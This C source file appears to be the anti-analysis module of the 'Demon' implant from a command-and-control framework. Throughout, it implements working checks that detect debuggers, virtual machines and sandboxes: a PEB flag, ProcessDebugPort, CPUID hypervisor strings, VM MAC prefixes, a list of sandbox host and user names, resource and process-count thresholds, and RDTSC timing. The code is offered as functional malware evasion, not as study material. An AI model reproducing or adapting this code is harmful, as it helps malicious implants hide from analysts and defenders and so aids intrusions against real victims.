#include <Demon.h>
#include <core/AntiAnalysis.h>
#include <core/MiniStd.h>
#include <core/Win32.h>

#ifdef __GNUC__
#include <x86intrin.h>
#endif

#ifdef ANTI_ANALYSIS

/* Simple strstr implementation for sandbox name matching */
static PCHAR StrStrA(
    _In_ PCHAR Haystack,
    _In_ PCHAR Needle
) {
    if ( ! Haystack || ! Needle ) {
        return NULL;
    }
    
    if ( *Needle == 0 ) {
        return Haystack;
    }

    while ( *Haystack ) {
        PCHAR h = Haystack;
        PCHAR n = Needle;

        while ( *h && *n && *h == *n ) {
            h++;
            n++;
        }

        if ( *n == 0 ) {
            return Haystack;
        }

        Haystack++;
    }

    return NULL;
}

/* Known sandbox hostnames/usernames (lowercase for comparison) */
static CHAR* SandboxNames[] = {
    "sandbox",
    "malware", 
    "virus",
    "test",
    "cuckoo",
    "sample",
    "analyst",
    "vmware",
    "virtual",
    "admin",
    "user",
    "john",
    "peter",
    NULL
};

/* Check if string contains any sandbox indicator (case insensitive) */
BOOL ContainsSandboxName(
    _In_ PWCHAR Name
) {
    CHAR  NameLower[256] = { 0 };
    DWORD NameLen        = 0;
    DWORD i              = 0;

    if ( ! Name ) {
        return FALSE;
    }

    /* Convert wide string to lowercase ASCII for comparison */
    while ( Name[NameLen] && NameLen < 255 ) {
        WCHAR c = Name[NameLen];
        if ( c >= L'A' && c <= L'Z' ) {
            c = c - L'A' + L'a';
        }
        NameLower[NameLen] = (CHAR)c;
        NameLen++;
    }
    NameLower[NameLen] = 0;

    /* Check against sandbox name list */
    for ( i = 0; SandboxNames[i] != NULL; i++ ) {
        if ( StrStrA( NameLower, SandboxNames[i] ) ) {
            return TRUE;
        }
    }

    return FALSE;
}

/*!
 * @brief
 *  Check for attached debuggers using PEB BeingDebugged flag
 *  and NtQueryInformationProcess with ProcessDebugPort.
 */
BOOL AntiAnalysisDebugger(
    VOID
) {
    NTSTATUS Status      = STATUS_SUCCESS;
    DWORD_PTR DebugPort  = 0;
    ULONG     ReturnLen  = 0;

    /* Check PEB BeingDebugged flag - direct memory access, no API call */
    if ( Instance->Teb && Instance->Teb->ProcessEnvironmentBlock ) {
        if ( Instance->Teb->ProcessEnvironmentBlock->BeingDebugged ) {
            PRINTF_DONT_SEND( "Debugger detected: PEB BeingDebugged flag set\n" )
            return TRUE;
        }
    }

    /* Check ProcessDebugPort using NtQueryInformationProcess */
    if ( Instance->Win32.NtQueryInformationProcess ) {
        Status = Instance->Win32.NtQueryInformationProcess(
            NtCurrentProcess(),
            ProcessDebugPort,
            &DebugPort,
            sizeof( DebugPort ),
            &ReturnLen
        );

        if ( NT_SUCCESS( Status ) && DebugPort != 0 ) {
            PRINTF_DONT_SEND( "Debugger detected: ProcessDebugPort = 0x%p\n", DebugPort )
            return TRUE;
        }
    }

    return FALSE;
}

/*!
 * @brief
 *  Check for virtual machine using CPUID hypervisor brand string.
 *  CPUID leaf 0x40000000 returns hypervisor vendor ID if present.
 */
BOOL AntiAnalysisVmCpuid(
    VOID
) {
    INT  CpuInfo[4]          = { 0 };
    CHAR HypervisorId[13]    = { 0 };

    /* CPUID with leaf 1 - check hypervisor present bit (ECX bit 31) */
    __cpuid( CpuInfo, 1 );
    if ( ! ( CpuInfo[2] & ( 1 << 31 ) ) ) {
        /* Hypervisor not present */
        return FALSE;
    }

    /* CPUID with leaf 0x40000000 - get hypervisor vendor ID */
    __cpuid( CpuInfo, 0x40000000 );
    
    /* Copy EBX, ECX, EDX to form vendor string */
    MemCopy( HypervisorId,      &CpuInfo[1], 4 );  /* EBX */
    MemCopy( HypervisorId + 4,  &CpuInfo[2], 4 );  /* ECX */
    MemCopy( HypervisorId + 8,  &CpuInfo[3], 4 );  /* EDX */
    HypervisorId[12] = 0;

    PRINTF_DONT_SEND( "Hypervisor ID: %s\n", HypervisorId )

    /* Check for known hypervisor IDs */
    /* VMware: "VMwareVMware" */
    if ( HypervisorId[0] == 'V' && HypervisorId[1] == 'M' && 
         HypervisorId[2] == 'w' && HypervisorId[3] == 'a' ) {
        PRINTF_DONT_SEND( "VM detected: VMware\n" )
        return TRUE;
    }
    
    /* VirtualBox: "VBoxVBoxVBox" */
    if ( HypervisorId[0] == 'V' && HypervisorId[1] == 'B' && 
         HypervisorId[2] == 'o' && HypervisorId[3] == 'x' ) {
        PRINTF_DONT_SEND( "VM detected: VirtualBox\n" )
        return TRUE;
    }
    
    /* Hyper-V: "Microsoft Hv" */
    if ( HypervisorId[0] == 'M' && HypervisorId[1] == 'i' && 
         HypervisorId[2] == 'c' && HypervisorId[3] == 'r' ) {
        PRINTF_DONT_SEND( "VM detected: Hyper-V\n" )
        return TRUE;
    }
    
    /* KVM: "KVMKVMKVM\0\0\0" */
    if ( HypervisorId[0] == 'K' && HypervisorId[1] == 'V' && 
         HypervisorId[2] == 'M' && HypervisorId[3] == 'K' ) {
        PRINTF_DONT_SEND( "VM detected: KVM\n" )
        return TRUE;
    }
    
    /* Xen: "XenVMMXenVMM" */
    if ( HypervisorId[0] == 'X' && HypervisorId[1] == 'e' && 
         HypervisorId[2] == 'n' && HypervisorId[3] == 'V' ) {
        PRINTF_DONT_SEND( "VM detected: Xen\n" )
        return TRUE;
    }

    /* Parallels: "prl hyperv" */
    if ( HypervisorId[0] == 'p' && HypervisorId[1] == 'r' && 
         HypervisorId[2] == 'l' && HypervisorId[3] == ' ' ) {
        PRINTF_DONT_SEND( "VM detected: Parallels\n" )
        return TRUE;
    }

    return FALSE;
}

/*!
 * @brief
 *  Check for VM using MAC address prefixes.
 *  Uses GetAdaptersInfo from iphlpapi.dll
 */
BOOL AntiAnalysisVmMac(
    VOID
) {
    typedef DWORD (WINAPI *fnGetAdaptersInfo)( PIP_ADAPTER_INFO, PULONG );

    HMODULE             Iphlpapi     = NULL;
    fnGetAdaptersInfo   pGetAdapters = NULL;
    PIP_ADAPTER_INFO    AdapterInfo  = NULL;
    PIP_ADAPTER_INFO    Adapter      = NULL;
    ULONG               BufLen       = sizeof( IP_ADAPTER_INFO );
    DWORD               MacPrefix    = 0;
    BOOL                Detected     = FALSE;

    /* Load iphlpapi if not already loaded */
    if ( ! Instance->Modules.Iphlpapi ) {
        PRINTF_DONT_SEND( "iphlpapi not loaded, skipping MAC check\n" )
        return FALSE;
    }

    pGetAdapters = LdrFunctionAddr( Instance->Modules.Iphlpapi, H_FUNC_GETADAPTERSINFO );
    if ( ! pGetAdapters ) {
        PRINTF_DONT_SEND( "GetAdaptersInfo not found\n" )
        return FALSE;
    }

    /* First call to get required buffer size */
    AdapterInfo = Instance->Win32.LocalAlloc( LPTR, BufLen );
    if ( ! AdapterInfo ) {
        return FALSE;
    }

    if ( pGetAdapters( AdapterInfo, &BufLen ) == ERROR_BUFFER_OVERFLOW ) {
        Instance->Win32.LocalFree( AdapterInfo );
        AdapterInfo = Instance->Win32.LocalAlloc( LPTR, BufLen );
        if ( ! AdapterInfo ) {
            return FALSE;
        }
    }

    if ( pGetAdapters( AdapterInfo, &BufLen ) != NO_ERROR ) {
        Instance->Win32.LocalFree( AdapterInfo );
        return FALSE;
    }

    /* Walk adapter list and check MAC prefixes */
    Adapter = AdapterInfo;
    while ( Adapter ) {
        if ( Adapter->AddressLength >= 3 ) {
            MacPrefix = ( Adapter->Address[0] << 16 ) | 
                        ( Adapter->Address[1] << 8 ) | 
                        Adapter->Address[2];

            PRINTF_DONT_SEND( "MAC prefix: %02X:%02X:%02X\n", 
                Adapter->Address[0], Adapter->Address[1], Adapter->Address[2] )

            switch ( MacPrefix ) {
                case MAC_VBOX_1:
                    PRINTF_DONT_SEND( "VM detected: VirtualBox MAC\n" )
                    Detected = TRUE;
                    break;
                case MAC_VMWARE_1:
                case MAC_VMWARE_2:
                case MAC_VMWARE_3:
                case MAC_VMWARE_4:
                    PRINTF_DONT_SEND( "VM detected: VMware MAC\n" )
                    Detected = TRUE;
                    break;
                case MAC_PARALLELS:
                    PRINTF_DONT_SEND( "VM detected: Parallels MAC\n" )
                    Detected = TRUE;
                    break;
                case MAC_XEN:
                    PRINTF_DONT_SEND( "VM detected: Xen MAC\n" )
                    Detected = TRUE;
                    break;
            }

            if ( Detected ) {
                break;
            }
        }
        Adapter = Adapter->Next;
    }

    Instance->Win32.LocalFree( AdapterInfo );
    return Detected;
}

/*!
 * @brief
 *  Check for sandbox by hostname and username patterns.
 */
BOOL AntiAnalysisSandboxName(
    VOID
) {
    typedef BOOL (WINAPI *fnGetComputerNameW)( LPWSTR, LPDWORD );
    typedef BOOL (WINAPI *fnGetUserNameW)( LPWSTR, LPDWORD );

    fnGetComputerNameW pGetComputerName = NULL;
    fnGetUserNameW     pGetUserName     = NULL;
    WCHAR              ComputerName[256] = { 0 };
    WCHAR              UserName[256]     = { 0 };
    DWORD              Size              = 256;

    if ( ! Instance->Modules.Kernel32 ) {
        return FALSE;
    }

    pGetComputerName = LdrFunctionAddr( Instance->Modules.Kernel32, H_FUNC_GETCOMPUTERNAMEW );
    pGetUserName     = LdrFunctionAddr( Instance->Modules.Advapi32, H_FUNC_GETUSERNAMEW );

    /* Check computer name */
    if ( pGetComputerName ) {
        Size = 256;
        if ( pGetComputerName( ComputerName, &Size ) ) {
            PRINTF_DONT_SEND( "Computer name: %ls\n", ComputerName )
            if ( ContainsSandboxName( ComputerName ) ) {
                PRINTF_DONT_SEND( "Sandbox detected: hostname contains sandbox indicator\n" )
                return TRUE;
            }
        }
    }

    /* Check username */
    if ( pGetUserName ) {
        Size = 256;
        if ( pGetUserName( UserName, &Size ) ) {
            PRINTF_DONT_SEND( "Username: %ls\n", UserName )
            if ( ContainsSandboxName( UserName ) ) {
                PRINTF_DONT_SEND( "Sandbox detected: username contains sandbox indicator\n" )
                return TRUE;
            }
        }
    }

    return FALSE;
}

/*!
 * @brief
 *  Check for sandbox by low system resources (RAM, disk, CPU cores).
 */
BOOL AntiAnalysisSandboxResources(
    VOID
) {
    typedef BOOL (WINAPI *fnGlobalMemoryStatusEx)( LPMEMORYSTATUSEX );
    typedef BOOL (WINAPI *fnGetDiskFreeSpaceExW)( LPCWSTR, PULARGE_INTEGER, PULARGE_INTEGER, PULARGE_INTEGER );
    typedef VOID (WINAPI *fnGetSystemInfo)( LPSYSTEM_INFO );

    fnGlobalMemoryStatusEx pGlobalMemoryStatusEx = NULL;
    fnGetDiskFreeSpaceExW  pGetDiskFreeSpaceExW  = NULL;
    fnGetSystemInfo        pGetSystemInfo        = NULL;
    MEMORYSTATUSEX         MemStatus             = { 0 };
    ULARGE_INTEGER         TotalBytes            = { 0 };
    SYSTEM_INFO            SysInfo               = { 0 };
    ULONGLONG              RamGB                 = 0;
    ULONGLONG              DiskGB                = 0;

    if ( ! Instance->Modules.Kernel32 ) {
        return FALSE;
    }

    pGlobalMemoryStatusEx = LdrFunctionAddr( Instance->Modules.Kernel32, H_FUNC_GLOBALMEMORYSTATUSEX );
    pGetDiskFreeSpaceExW  = LdrFunctionAddr( Instance->Modules.Kernel32, H_FUNC_GETDISKFREESPACEEXW );
    pGetSystemInfo        = LdrFunctionAddr( Instance->Modules.Kernel32, H_FUNC_GETSYSTEMINFO );

    /* Check RAM */
    if ( pGlobalMemoryStatusEx ) {
        MemStatus.dwLength = sizeof( MEMORYSTATUSEX );
        if ( pGlobalMemoryStatusEx( &MemStatus ) ) {
            RamGB = MemStatus.ullTotalPhys / ( 1024 * 1024 * 1024 );
            PRINTF_DONT_SEND( "Total RAM: %llu GB\n", RamGB )
            if ( RamGB < MIN_RAM_GB ) {
                PRINTF_DONT_SEND( "Sandbox detected: low RAM (%llu GB < %d GB)\n", RamGB, MIN_RAM_GB )
                return TRUE;
            }
        }
    }

    /* Check disk space */
    if ( pGetDiskFreeSpaceExW ) {
        if ( pGetDiskFreeSpaceExW( L"C:\\", NULL, &TotalBytes, NULL ) ) {
            DiskGB = TotalBytes.QuadPart / ( 1024 * 1024 * 1024 );
            PRINTF_DONT_SEND( "Total disk: %llu GB\n", DiskGB )
            if ( DiskGB < MIN_DISK_GB ) {
                PRINTF_DONT_SEND( "Sandbox detected: low disk (%llu GB < %d GB)\n", DiskGB, MIN_DISK_GB )
                return TRUE;
            }
        }
    }

    /* Check CPU cores */
    if ( pGetSystemInfo ) {
        pGetSystemInfo( &SysInfo );
        PRINTF_DONT_SEND( "CPU cores: %d\n", SysInfo.dwNumberOfProcessors )
        if ( SysInfo.dwNumberOfProcessors < MIN_CPU_CORES ) {
            PRINTF_DONT_SEND( "Sandbox detected: low CPU cores (%d < %d)\n", 
                SysInfo.dwNumberOfProcessors, MIN_CPU_CORES )
            return TRUE;
        }
    }

    return FALSE;
}

/*!
 * @brief
 *  Check for sandbox by low process count.
 */
BOOL AntiAnalysisProcessCount(
    VOID
) {
    HANDLE hSnapshot    = NULL;
    PROCESSENTRY32W Pe  = { 0 };
    DWORD  Count        = 0;

    if ( ! Instance->Win32.CreateToolhelp32Snapshot || 
         ! Instance->Win32.Process32FirstW || 
         ! Instance->Win32.Process32NextW ) {
        return FALSE;
    }

    hSnapshot = Instance->Win32.CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );
    if ( hSnapshot == INVALID_HANDLE_VALUE ) {
        return FALSE;
    }

    Pe.dwSize = sizeof( PROCESSENTRY32W );

    if ( Instance->Win32.Process32FirstW( hSnapshot, &Pe ) ) {
        do {
            Count++;
        } while ( Instance->Win32.Process32NextW( hSnapshot, &Pe ) );
    }

    SysNtClose( hSnapshot );

    PRINTF_DONT_SEND( "Process count: %d\n", Count )

    if ( Count < MIN_PROCESS_COUNT ) {
        PRINTF_DONT_SEND( "Sandbox detected: low process count (%d < %d)\n", Count, MIN_PROCESS_COUNT )
        return TRUE;
    }

    return FALSE;
}

/*!
 * @brief
 *  Check for VM using RDTSC timing attack.
 *  VMs have overhead on CPUID that causes timing delays.
 */
BOOL AntiAnalysisTiming(
    VOID
) {
    UINT64 Start = 0;
    UINT64 End   = 0;
    UINT64 Delta = 0;
    INT    CpuInfo[4] = { 0 };

    /* Measure time for CPUID instruction (forces VM exit) */
    Start = __rdtsc();
    __cpuid( CpuInfo, 0 );
    End = __rdtsc();

    Delta = End - Start;
    PRINTF_DONT_SEND( "RDTSC delta: %llu\n", Delta )

    if ( Delta > RDTSC_THRESHOLD ) {
        PRINTF_DONT_SEND( "VM detected: high RDTSC delta (%llu > %d)\n", Delta, RDTSC_THRESHOLD )
        return TRUE;
    }

    return FALSE;
}

/*!
 * @brief
 *  Main anti-analysis check function.
 *  Runs all configured detection checks.
 */
BOOL AntiAnalysisCheck(
    _Out_opt_ PANTI_ANALYSIS_RESULT Result
) {
    ANTI_ANALYSIS_RESULT LocalResult = { 0 };

    PUTS_DONT_SEND( "Running anti-analysis checks..." )

    /* Debugger detection */
    if ( AntiAnalysisDebugger() ) {
        LocalResult.Detected = TRUE;
        LocalResult.DetectionType |= DETECTED_DEBUGGER;
    }

    /* VM detection - CPUID */
    if ( AntiAnalysisVmCpuid() ) {
        LocalResult.Detected = TRUE;
        LocalResult.DetectionType |= DETECTED_VM_CPUID;
    }

    /* VM detection - MAC address */
    if ( AntiAnalysisVmMac() ) {
        LocalResult.Detected = TRUE;
        LocalResult.DetectionType |= DETECTED_VM_MAC;
    }

    /* Sandbox detection - hostname/username */
    if ( AntiAnalysisSandboxName() ) {
        LocalResult.Detected = TRUE;
        LocalResult.DetectionType |= DETECTED_SANDBOX_NAME;
    }

    /* Sandbox detection - low resources */
    if ( AntiAnalysisSandboxResources() ) {
        LocalResult.Detected = TRUE;
        LocalResult.DetectionType |= DETECTED_SANDBOX_RESOURCES;
    }

    /* Sandbox detection - process count */
    if ( AntiAnalysisProcessCount() ) {
        LocalResult.Detected = TRUE;
        LocalResult.DetectionType |= DETECTED_PROCESS_COUNT;
    }

    /* Timing attack */
    if ( AntiAnalysisTiming() ) {
        LocalResult.Detected = TRUE;
        LocalResult.DetectionType |= DETECTED_TIMING;
    }

    if ( LocalResult.Detected ) {
        PRINTF_DONT_SEND( "Anti-analysis: DETECTED (flags: 0x%04x)\n", LocalResult.DetectionType )
    } else {
        PUTS_DONT_SEND( "Anti-analysis: No threats detected" )
    }

    if ( Result ) {
        *Result = LocalResult;
    }

    return LocalResult.Detected;
}

#endif /* ANTI_ANALYSIS */
